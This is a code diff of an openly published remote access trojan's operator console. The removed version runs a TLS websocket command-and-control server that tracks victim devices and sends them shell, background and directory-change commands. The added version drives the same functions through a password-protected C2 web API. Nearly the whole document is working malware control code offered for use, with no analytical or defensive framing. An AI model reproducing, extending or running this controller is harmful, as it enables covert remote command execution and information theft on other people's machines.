@@ -1,65 +1,48 @@
-__author__ = "赵博凯"
+__author__ = "Zhao Bokai"
 __license__ = "GPL v3"
 
-import asyncio
-import websockets
-import ssl
-import rich
+import requests
 import json
+
+import rich.console
+import rich.table
+import rich.text
+
 from sys import exit
 
-from rich.console import Console
-from rich.table import Table
-from rich.json import JSON
-import rich.traceback 
+# Server configuration
+APT_SITE = "http://localhost:5000"  # Server address
+API_PATH = "fuck"  # API path
+APT_PASSWORD = "fuck"  # Access password
 
-# Install rich traceback with local variables display
-rich.traceback.install(show_locals=True)
-
-# --- Basic Configuration ---
-# HOST: IP address the server listens on
-# PORT: Port number the server listens on
-# SSL_CERT: SSL certificate file path
-# SSL_KEY: SSL private key file path
-HOST = '0.0.0.0' 
-PORT = 8765
-SSL_CERT = '../cert.pem' 
-SSL_KEY = '../key.pem' 
-
-# --- Global Variables ---
-# control_list: Stores all connected client information
-# select_client: Currently selected client ID
-control_list = {}
-select_client = None
-
-# --- Custom Logging Output Function ---
+# Logging output class
 class Printer:
-    """Custom logging print class supporting different levels of log output"""
+    """Custom log printer with color support"""
     def __init__(self):
-        self.console = Console()
+        self.console = rich.console.Console()
     
     def log_info(self, message: str):
-        """Output info level log"""
+        """Print info log"""
         self.console.log(f"[white on blue][*][/white on blue]", message, style="white")
 
     def log_warning(self, message: str):
-        """Output warning level log"""
+        """Print warning log"""
         self.console.log(f"[white on yellow][!][/white on yellow]", message, style="yellow")
 
     def log_error(self, message: str):
-        """Output error level log"""
+        """Print error log"""
         self.console.log(f"[white on red][-][/white on red]", message, style="bold red")
 
     def log_success(self, message: str):
-        """Output success level log"""
+        """Print success log"""
         self.console.log(f"[white on green][+][/white on green]", message, style="green")
     
     def log_debug(self, message: str):
-        """Output debug level log"""
+        """Print debug log"""
         self.console.log(f"[grey50][|][/grey50]", message, style="grey50")
 
 def output(*args, type=""):
-    # Log output function, calls different print methods based on type
+    """Unified log output interface"""
     printer = Printer()
     if type.strip() == "":
         printer.console.log(*args)
@@ -77,264 +60,210 @@ def output(*args, type=""):
         else:
             raise ValueError(f"Invalid type: {type}")
 
-
-# --- Server Logic ---
+# Server operations class
 class Server:
-    """Server core functionality class, handles server-level command operations"""
-    def __init__(self):
-        pass
-    
-    def help(self):
-        """Display help information"""
-        help_text = '''Help Information:
-[u bold yellow]help[/u bold yellow]:[green] Show help information[/green]
-[u bold yellow]about[/u bold yellow]:[green] Show about information[/green]
-[u bold yellow]exit[/u bold yellow]:[green] Exit program[/green]
-[u bold yellow]clear[/u bold yellow]:[green] Clear terminal screen[/green]
-[u bold yellow]list[/u bold yellow]:[green] Show list of connected devices[/green]
-[u bold yellow]select <id>[/u bold yellow]:[green] Select a device to control[/green]
-[u bold yellow]delete <id>[/u bold yellow]:[green] Delete connected device[/green]'''  
-        output(help_text, type="info")
+    @staticmethod
+    def device_list():
+        """Get and display device list"""
+        response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
+                                json={"func_name": "device_list"}, 
+                                cookies=cookie)
+        if not response.ok: 
+            raise Exception(f"Request failed: {response.status_code} {response.json()}")
+        result = response.json()
+        if type(result) != list:
+            output(result, type="info")
+            return
+        Table = rich.table.Table(title="Device List")
+        Table.add_column("Device ID", justify="center", style="cyan")
+        Table.add_column("Device IP", justify="center", style="magenta")
+        Table.add_column("Device Info", justify="center", style="green")
+        for i in result:
+            Table.add_row(rich.text.Text(i["id"], overflow="fold"), 
+                            rich.text.Text(i["ip"], overflow="fold"), 
+                            rich.text.Text(i["systeminfo"], overflow="fold"))
+        output(Table)
 
-    def about(self):
-        """Display about information"""
-        about_text = '''About:
-Author: 赵博凯
-Copyright: Copyright © 赵博凯 2025, All Rights Reserved.
-This is open source software, link: [link=https://github.com/zhaobokai341/remote_access_trojan]https://github.com/zhaobokai341/remote_access_trojan[/link]
-Uses GPL v3 license, please comply with the license.'''
-        output(about_text, type="info")
+    @staticmethod
+    def select_device(id):
+        """Select device to control"""
+        response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
+                                    json={"func_name": "command", "id": id, "command": "echo hello world"}, 
+                                    cookies=cookie)
+        if not response.ok: 
+            raise Exception(f"Request failed: {response.status_code} {response.json()}")
+        output(f"Selected device: {id}", type="success")
+        return id
+
+    @staticmethod   
+    def delete_device(id):
+        """Delete specified device"""
+        response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
+                                    json={"func_name": "delete", "id": id}, 
+                                    cookies=cookie)
+        if not response.ok: 
+            raise Exception(f"Request failed: {response.status_code} {response.json()}")
+        output(f"Deleted device: {id}", type="success")
+        
+    @staticmethod
+    def systeminfo(id):
+        """Get device system information"""
+        response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
+                                json={"func_name": "systeminfo", "id": id}, 
+                                cookies=cookie)
+        if not response.ok: 
+            raise Exception(f"Request failed: {response.status_code} {response.json()}")
+        system_info = json.loads(response.json()["message"])
+        with open("systeminfo.json", "w") as f:
+            json.dump(system_info, f, indent=4, ensure_ascii=False)
+        rich.print_json(data=system_info)
+        output("System information saved to systeminfo.json file", type="success")
+
+    @staticmethod
+    def command(id):
+        """Enter device command mode"""
+        while True:
+            command = input(f"(command)<{id}>>")
+            if command.strip().lower() == "exit": 
+                break
+            response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
+                                     json={"func_name": "command", "id": id, "command": command},
+                                     cookies=cookie)
+            result = response.json()
+            if not response.ok: 
+                raise Exception(f"Request failed: {response.status_code} {result["error"]}")
+            result = json.loads(result["message"])
+            for i in result.items():
+                output(f"{i[0]}: {i[1]}", type="info")
     
-    def client_list(self):
-        """Display list of connected clients"""
-        if len(control_list) == 0:
-            output("No devices currently connected.", type="info")
+    @staticmethod
+    def background(id, command):
+        """Execute command in background on device"""
+        response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
+                                json={"func_name": "background", "id": id, "command": command}, 
+                                cookies=cookie)
+        result = response.json()
+        if not response.ok: 
+            raise Exception(f"Request failed: {response.status_code} {result["error"]}")
+        if "sent" in result["message"]:
+            output(f"Successfully executed command in background: {command}", type="success")
         else:
-            output(f"Currently {len(control_list)} devices connected", type="info")
-            output("Connected device list:", type="info")
-            # Create table using rich library's Table class
-            table = Table(
-                title="Device Information",
-                title_style="bold blue",
-                show_header=True,
-                border_style="bold purple",
-                show_lines=True,
-                expand=True
-            )
-            table.add_column("[bold red]Device ID[/bold red]")
-            table.add_column("[bold #FFA500]IP Address[/bold #FFA500]")
-            table.add_column("[bold yellow]Connection Status[/bold yellow]")
-            table.add_column("[bold green]System Info[/bold green]")
-            for device in control_list.items():
-                table.add_row(f"{device[0]}", 
-                              f"{device[1]['ip']}", 
-                              f"{device[1]['status']}",
-                              f"{device[1]['systeminfo']}")
-            output(table, type="info")
-            del table
-
-    def select(self, id):
-        """Select client to control"""
-        global select_client
-        if id in control_list:
-            select_client = id
-            output(f"Selected device with ID {id}.", type="success")
+            output(f"Command execution failed: {result["message"]}", type="error")
+    
+    @staticmethod
+    def cd(id, directory):
+        """Change device working directory"""
+        response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
+                                json={"func_name": "change_directory", "id": id, "directory": directory}, 
+                                cookies=cookie)
+        result = response.json()
+        if not response.ok: 
+            raise Exception(f"Request failed: {response.status_code} {result["error"]}")
+        if "successfully" in result["message"]:
+            output(f"Changed working directory: {directory}", type="success")
         else:
-            output(f"Device with ID {id} does not exist.", type="error")
-    
-    async def delete(self, id):
-        """Delete specified client connection"""
-        global control_list, select_client
-        if id in control_list:
-            websocket = control_list[id]['websocket']
-            try:
-                await websocket.send("exit")
-            except Exception as e:
-                output(f"Exception occurred while disconnecting device with ID {id}: {e}", type="warning")
-            control_list.pop(id)
-            if select_client == id:
-                select_client = None
-                output("Deleted device was your currently controlled device, automatically returned to previous level", type="info")
-            output(f"Successfully deleted device with ID {id}.", type="success")
-        else:
-            output(f"Device with ID {id} does not exist.", type="error")
+            output(f"Failed to change working directory: {result["message"]}", type="error")
 
-# --- Target Device Control Logic ---
-class ControlClient:
-    """Client control class, handles operations on selected client"""
-    def __init__(self, id):
-        self.id = id
-        self.websocket = control_list[id]['websocket']
-
-    def help(self):
-        """Display client control help information"""
-        help_text = '''Help Information:
-[u bold yellow]help[/u bold yellow]:[green] Show help information[/green]
-[u bold yellow]about[/u bold yellow]:[green] Show about information[/green]
-[u bold yellow]back[/u bold yellow]:[green] Return to previous level[/green]
-[u bold yellow]clear[/u bold yellow]:[green] Clear terminal screen[/green]
-[u bold yellow]list[/u bold yellow]:[green] Show list of connected devices[/green]
-[u bold yellow]select <id>[/u bold yellow]:[green] Select a device to control[/green]
-[u bold yellow]delete <id>[/u bold yellow]:[green] Delete connected device[/green]
-[u bold yellow]command[/u bold yellow]:[green] Enter command mode to execute commands and return results[/green]
-[u bold yellow]background <command>[/u bold yellow]:[green] Run command in background without returning results[/green]
-[u bold yellow]cd <dir>[/u bold yellow]:[green] Change working directory[/green]'''
-        output(help_text, type="info")
-    
-    async def execute_command(self, command):
-        """Execute command and return result"""
-        await self.websocket.send(f"command:{command}")
-        result = await self.websocket.recv()
-        return result
-
-    async def background(self, command):
-        """Execute command in background"""
-        await self.websocket.send(f"background:{command}")
-        await self.websocket.recv()
-        output("Command sent", type="success")
-
-    async def change_directory(self, directory):
-        """Change working directory"""
-        await self.websocket.send(f"cd:{directory}")
-        result = await self.websocket.recv()
-        return result
-
-
-# --- Client Connection Handling Logic ---
-async def handle_client(websocket):
-    """Handle new client connection"""
-    ip = websocket.remote_address[0] + ":" + str(websocket.remote_address[1])
-    try:
-        systeminfo = await websocket.recv()
-    except Exception:
-        systeminfo = "ERROR"
-    # Add new client information to control list
-    control_list[str(websocket.id)] = {
-        "ip": ip,
-        "status": "connected",
-        "websocket": websocket,
-        "systeminfo": systeminfo
-    }
-    await websocket.wait_closed()
-    
-# --- Client Connection Status Check ---
-async def check_clients_connection():
-    """Periodically check connection status of all clients"""
-    global control_list
+def command_input():
+    """Main command line interaction loop"""
+    select_device = None
     while True:
-        if len(control_list) > 0:
-            for device in control_list.items():
-                try:
-                    # Send ping to check connection
-                    await device[1]['websocket'].ping()
-                    control_list[device[0]]['status'] = "connected"
-                    if select_client == device[0]:
-                        control_list[device[0]]['status'] = "used"
-                except:
-                    control_list[device[0]]['status'] = "disconnected"
-        await asyncio.sleep(10)
+        try:
+            # Device control mode
+            if not select_device is None:
+                command = input(f"(console)<{select_device}>>")
+                command = command.strip()
+                match command:
+                    case "": pass
+                    case "help": 
+                        output('''Help Information:
+    [u bold yellow]help[/u bold yellow]: [green]Show help information[/green]
+    [u bold yellow]back[/u bold yellow]: [green]Return to previous level[/green]
+    [u bold yellow]clear[/u bold yellow]: [green]Clear terminal screen[/green]
+    [u bold yellow]list[/u bold yellow]: [green]Show connected device list[/green]
+    [u bold yellow]select <id>[/u bold yellow]: [green]Select a device to control[/green]
+    [u bold yellow]systeminfo[/u bold yellow]: [green]Display device system information[/green]
+    [u bold yellow]command[/u bold yellow]: [green]Enter command mode to execute commands and get results[/green]
+    [u bold yellow]background <command>[/u bold yellow]: [green]Run command in background without returning results[/green]
+    [u bold yellow]cd <dir>[/u bold yellow]: [green]Change working directory[/green]''', type="info")
+                    case "back": 
+                        select_device = None
+                    case "clear": 
+                        print("\033c")
+                    case "list": 
+                        Server.device_list()
+                    case "systeminfo":
+                        Server.systeminfo(select_device)
+                    case command if command.startswith("select "): 
+                        select_device = Server.select_device(command.split(" ", 1)[1])
+                    case command if command.startswith("command"): 
+                        Server.command(select_device)
+                    case command if command.startswith("bg "): 
+                        Server.background(select_device, command.split(" ", 1)[1])
+                    case command if command.startswith("cd "): 
+                        Server.cd(select_device, command.split(" ", 1)[1])
+                    case _: 
+                        output(f"Unknown command: {command}, type help for help", type="error")
+                continue
 
-# --- User Interaction Logic ---
-async def input_loop():
-    """Main loop for handling user input"""
-    global select_client, control_list
-
-    server = Server()
-    while True:
-        if select_client is None:
-            # Server level command processing
-            command = await asyncio.to_thread(input, "(server)> ")
-            command = command.strip()
+            # Server control mode
+            command = input("(server)>")
+            command = command.strip().lower()
             match command:
-                case "": continue
-                case "help": server.help()
-                case "about": server.about()
-                case "exit": output("Program exited normally.", type="success");exit()
-                case "clear": print("\033[H\033[J")
-                case "list": server.client_list()
-                case command if command.startswith("select"): 
-                    server.select(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("Please enter device ID.", type="error")
-                case command if command.startswith("delete"): 
-                    await server.delete(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("Please enter device ID.", type="error")
-                case _: output(f"Unknown command: {command}, please enter help to view available commands.", type="error")
+                case "": pass
+                case "exit": 
+                    exit(0)
+                case "help":
+                    output('''Help Information:
+    [u bold yellow]help[/u bold yellow]: [green]Show help information[/green]
+    [u bold yellow]about[/u bold yellow]: [green]Show about information[/green]
+    [u bold yellow]exit[/u bold yellow]: [green]Exit program[/green]
+    [u bold yellow]clear[/u bold yellow]: [green]Clear terminal screen[/green]
+    [u bold yellow]list[/u bold yellow]: [green]Show connected device list[/green]
+    [u bold yellow]select <id>[/u bold yellow]: [green]Select a device to control[/green]
+    [u bold yellow]delete <id>[/u bold yellow]: [green]Delete connected device[/green]'''  , type="info")
+                case "clear": 
+                    print("\033c")
+                case "about": 
+                    output('''About:
+Author: Zhao Bokai
+Copyright: Copyright © Zhao Bokai, All Rights Reserved.
+This is open-source software, link: [link=https://github.com/zhaobokai341/remote_access_trojan]https://github.com/zhaobokai341/remote_access_trojan[/link]
+Uses MIT license, please comply with the license''', type="info")
+                case "list": 
+                    Server.device_list()
+                case command if command.startswith("select "): 
+                    select_device = Server.select_device(command.split(" ", 1)[1])
+                case command if command.startswith("delete "): 
+                    Server.delete_device(command.split(" ", 1)[1])
+                case _: 
+                    output(f"Unknown command: {command}, type help for help", type="error")
+        except Exception as e:
+            output(f"Error occurred: {type(e).__name__}: {e}", type="error")
+
+if __name__ == "__main__":
+    # Program entry point
+    output("Copyright: Copyright © Zhao Bokai, All Rights Reserved.", type="info")
+    output("Program starting", type="info")
+    output("Verifying password", type="info")
+    try:
+        # Verify server password
+        response = requests.post(f"{APT_SITE}/{API_PATH}/verify", json={"password": APT_PASSWORD})
+        if response.status_code == 200:
+            cookie = response.json()
+            output(f"Verification successful, cookie: {cookie}", type="success")
         else:
-            # Client level command processing
-            control_client = ControlClient(select_client)
-            command = await asyncio.to_thread(input, f"(console)({select_client})> ")
-            command = command.strip()
-            match command:
-                case "": continue
-                case "help": control_client.help()
-                case "about": server.about()
-                case "back": select_client = None
-                case "clear": print("\033[H\033[J")
-                case "list": server.client_list()
-                case command if command.startswith("select"): 
-                    server.select(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("Please enter device ID.", type="error")
-                case command if command.startswith("delete"):
-                    await server.delete(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("Please enter device ID.", type="error")
-                case "command":
-                    # Command execution mode
-                    while True:
-                        try:
-                            command = await asyncio.to_thread(input, f"(command)({select_client})> ")
-                            if command == "exit":
-                                break
-                            else:
-                                if command.strip() == "":
-                                    continue
-                                result = await control_client.execute_command(command)
-                                result = json.loads(result)
-                                for key, value in result.items():
-                                    output(f"[bold cyan]{key}:[/bold cyan] {value}")
-                        except Exception as e:
-                            output(f"Exception occurred while executing command: {e}", type="error")
-                case command if command.startswith("background"):
-                    try:
-                        await control_client.background(command.split(maxsplit=1)[1]) if len(command.split(maxsplit=1)) > 1 else output("Please enter command.", type="error")
-                    except Exception as e:
-                        output(f"Exception occurred while running background command: {e}", type="error")
-                case command if command.startswith("cd"):
-                    try:
-                        result = await control_client.change_directory(command.split(maxsplit=1)[1]);output(result, type="info") if len(command.split(maxsplit=1)) > 1 else output("Please enter directory to change.", type="error")
-                    except Exception as e:
-                        output(f"Exception occurred while changing directory: {e}", type="error")
-                case _: output(f"Unknown command: {command}, please enter help to view available commands.", type="error")
-
-# --- Main Function ---
-async def server_loop():
-    """Main loop to start the server"""
-    output(f"Configuring certificate files, certificate location: {SSL_CERT}, key location: {SSL_KEY}", type="info")
-    try:
-        # Configure SSL context
-        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-        ssl_context.load_cert_chain(SSL_CERT, SSL_KEY)
-    except FileNotFoundError:
-        output("Certificate file or key file does not exist, please check configuration.", type="error")
-        exit()
-
-    output(f"Starting server, listening address: {HOST}, port: {PORT}", type="info")
-    # Start WebSocket server
-    async with websockets.serve(handle_client, HOST, PORT, ssl=ssl_context):
-        await asyncio.Future()
-
-async def main():
-    """Program main entry point"""
-    output("Starting program...", type="info")
-    # Concurrently run server, input loop and connection check
-    await asyncio.gather(
-        server_loop(),
-        input_loop(),
-        check_clients_connection()
-    )
-
-if __name__ == '__main__':
-    try:
-        print("\033[H\033[J")
-        output("Copyright: Copyright © 赵博凯, All Rights Reserved.")
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        output("Program manually interrupted by user.", type="warning")
-        exit()
+            output(f"Verification failed: {response.status_code} {response.json()}", type="error")
+            exit(1)
     except Exception as e:
-        output(f"Error: {e}, please report to [link=https://github.com/zhaobokai341/remote_access_trojan/issues]Issues[/link]", type="error")
+        output(f"Verification failed: {type(e).__name__}: {e}", type="error")
+        exit(1)
+
+    try:
+        # Start command line interaction
+        command_input()
+    except Exception as e:
+        output(f"Error occurred: {type(e).__name__}: {e}", type="error")
+    except KeyboardInterrupt:
+        output("User interrupted", type="warning")
+        exit(1)
